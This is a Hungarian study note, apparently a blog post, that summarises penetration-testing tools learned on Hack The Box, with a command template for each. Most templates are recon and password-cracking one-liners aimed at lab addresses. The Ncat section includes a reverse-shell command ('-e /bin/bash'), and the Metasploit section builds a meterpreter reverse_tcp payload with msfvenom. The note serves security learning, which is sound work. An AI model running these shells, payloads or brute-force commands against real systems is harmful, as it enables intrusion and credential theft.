A HTB-s tanulmányaim során már számos eszközt kipróbáltam, és a jövőben még sok újat fogok megismerni. Az alábbiakban látható egy lista az eszközökről, majd mindegyiket részletesen kifejtem, példákkal és hasznos parancssablonokkal kiegészítve.

---

### Eszközlista

**Nmap** – portszkennelés és szolgáltatások feltérképezése, a hálózat feltérképezésének alapvető eszköze.   
**Ncat** – hálózati kommunikáció és reverse shell létrehozása; segít a távoli rendszerekhez való csatlakozásban.  
**John the Ripper** – jelszavak hash-elt formájának feltörése, különösen szólisták és hash fájlok vizsgálatára.  
**Hashcat** – GPU-gyorsított jelszófeltörés, nagyobb hash fájlok és komplex jelszavak bruteforce-hoz.  
**Gobuster** – webes könyvtárak, fájlok bruteforce keresése, webalkalmazások feltérképezése.  
**ZAP** – webes sebezhetőségvizsgálat, fuzzer és proxy eszköz, a biztonsági tesztelés automatizálásához.  
**Burp Suite** – webalkalmazások biztonsági tesztelése, HTTP requestek manipulálása, scanner futtatása.  
**Whois** – domain információk lekérdezése, tulajdonos, regisztrátor és lejárati adatok.  
**Dig** – DNS lekérdezések és hibakeresés, gyorsan ellenőrzi a DNS bejegyzéseket.  
**Dnsenum** – DNS enumeráció és domain felderítés, aldomain-ek és névfeloldások vizsgálata.  
**Curl** – HTTP/HTTPS kérések tesztelése, API hívások ellenőrzése, adatlekérés parancssorból.  
**Smbclient** – SMB/CIFS hálózati megosztások kezelése, fájlok feltöltése és letöltése hálózaton keresztül.  
**Snmpwalk** – SNMP információgyűjtés hálózati eszközökről, konfigurációk és eszközadatok feltérképezéséhez.  
**Onesixtyone** – SNMP brute-force támadások, a community stringek feltörésére.  
**Metasploit Framework (msf)** – exploitok futtatása és pentesting keretrendszer, nagy teljesítményű automatizált támadásokhoz.  
**Msfvenom** – payload generálás és exploit előkészítés, különböző platformokra és protokollokra.

---

### Rövid kifejtés és hasznos parancssablonok

**Nmap**  
Az Nmap a hálózatok feltérképezésének alapja. Segítségével gyorsan megtudhatjuk, mely portok vannak nyitva, milyen szolgáltatások futnak rajtuk, és milyen verziójú szoftverek futnak a célgépen.  
Alap szkennelés:

```bash
nmap -sC -sV -oN scan.txt 10.10.10.10
```

Tippek: használható gyors szkennelésre, verziófelismerésre és akár operációs rendszer detektálásra is.

**Ncat**  
Az Ncat lehetővé teszi a hálózati kommunikációt és a reverse shell létrehozását, ami hasznos penetrációs tesztek során, amikor távoli hozzáférést akarunk tesztelni.  
Reverse shell létrehozása (listener oldalon):

```bash
ncat -lvnp 4444
```

Kapcsolódás távoli gépre:

```bash
ncat target_ip 4444 -e /bin/bash
```

Tippek: a Ncat könnyen kombinálható más eszközökkel a hálózati tesztelés során.

**John the Ripper**  
John a jelszóhash-ek feltörésére specializálódott. Többféle hash formátumot támogat, és szólisták alapján próbálja visszafejteni a jelszavakat.  
Hash feltörés:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Tippek: kombinálható más jelszólistákkal és hash formátumokkal, gyors eredményt ad kis hash fájlok esetén.

**Hashcat**  
Hashcat a GPU-gyorsításnak köszönhetően nagyobb hash állományokat képes hatékonyan brute-force módszerrel feltörni.  
GPU-gyorsított brute-force:

```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt
```

Tippek: ideális komplex hash-ekhez, konfigurálható támadási módokkal és szabályokkal.

**Gobuster**  
Gobuster segítségével webes könyvtárakat és fájlokat kereshetünk bruteforce módszerrel. Hasznos, ha a webalkalmazás struktúráját akarjuk feltérképezni.  
Webes könyvtárak feltérképezése:

```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Tippek: kombinálható különböző szólistákkal és HTTP státuszkód szűrésekkel.

**ZAP**  
A ZAP (OWASP Zed Attack Proxy) lehetővé teszi webes sebezhetőségek feltérképezését, proxyzását, és automatikus fuzzing-et a tesztelendő alkalmazásoknál.  
Tippek: automatikus scanner futtatása és egyéni fuzzer konfigurálása a gyakorlatban nagyon hasznos.

**Burp Suite**  
Burp Suite egy profi webalkalmazás-tesztelő eszköz, ami lehetővé teszi az HTTP kérések manipulálását, a sebezhetőségek keresését, és automatizált szkennelést.  
Tippek: az intercept módban módosíthatjuk a kéréseket, és a repeater funkcióval tesztelhetjük az exploitokat.

**Whois / Dig / Dnsenum**  
Ezek az eszközök a domain-ek és DNS bejegyzések vizsgálatára szolgálnak. Segítségükkel információt szerezhetünk a cél domain-ről és aldomain-jeiről.

```bash
whois example.com
dig example.com A
dnsenum example.com
```

Tippek: hasznos az információszerzés (reconnaissance) fázisban a webalkalmazások feltérképezéséhez.

**Curl**  
A Curl lehetővé teszi HTTP/HTTPS kérések tesztelését parancssorból, ideális API-k és weboldalak gyors ellenőrzésére.  
HTTP request:

```bash
curl -X GET http://10.10.10.10/page
```

Tippek: könnyen integrálható script-ekbe és automatizált tesztekbe.

**Smbclient**  
SMB megosztások eléréséhez és fájlok kezeléséhez használható. Ideális Windows-alapú hálózatok feltérképezésére.

```bash
smbclient //10.10.10.10/share -U username
```

Tippek: fájlok letöltésére, feltöltésére, valamint hozzáférések tesztelésére is használható.

**Snmpwalk / Onesixtyone**  
SNMP segítségével hálózati eszközökről szerezhetünk információkat. Onesixtyone lehetővé teszi a brute-force támadásokat, ha a community string nem ismert.

```bash
snmpwalk -v2c -c public 10.10.10.10
onesixtyone -c community_list.txt 10.10.10.0/24
```

Tippek: hasznos a hálózati infrastruktúra feltérképezésére és gyenge SNMP beállítások felfedezésére.

**Metasploit (msf / msfvenom)**  
A Metasploit egy hatékony keretrendszer exploitok futtatására, különböző platformokon. Msfvenom segítségével payloadokat generálhatunk a célrendszerekhez.  
Exploit futtatása:

```bash
msfconsole
```

Payload generálás:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
```

Tippek: a Metasploit moduljai lehetővé teszik gyors tesztelést, míg a msfvenom segítségével egyedi payloadokat készíthetünk.

---

Ez a lista természetesen nem teljes, hiszen a HTB tanulmányaim során folyamatosan új eszközöket és technikákat ismerek meg. Ugyanakkor jó alapot ad az eddig megszerzett tudás áttekintéséhez, és segít a további gyakorlásban.

---
